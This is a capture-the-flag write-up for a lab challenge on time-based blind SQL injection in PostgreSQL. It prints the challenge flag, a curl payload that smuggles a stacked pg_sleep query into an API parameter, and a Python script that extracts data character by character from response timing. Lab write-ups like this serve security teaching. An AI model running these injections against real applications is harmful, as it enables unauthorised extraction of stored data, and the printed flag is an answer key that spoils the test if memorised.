# SQLi-031: PostgreSQL pg_sleep - Writeup

## Flag: `FLAG{pg_sl33p_t1m3_bl1nd}`

## Payload

```bash
time curl "http://localhost:5031/api/check?key=key_abc123'; SELECT CASE WHEN (SELECT SUBSTRING(value,1,1) FROM flags)='F' THEN pg_sleep(2) END--"
```

## Exploit

```python
import requests, time

def check(cond):
    start = time.time()
    payload = f"key_abc123'; SELECT CASE WHEN ({cond}) THEN pg_sleep(2) END--"
    requests.get(f"http://localhost:5031/api/check?key={payload}")
    return time.time() - start > 1.5

flag = ""
for pos in range(1, 30):
    for c in "FLAG{}_0123456789abcdefghijklmnopqrstuvwxyz":
        if check(f"(SELECT SUBSTRING(value,{pos},1) FROM flags)='{c}'"):
            flag += c
            print(f"[+] {flag}")
            break
```
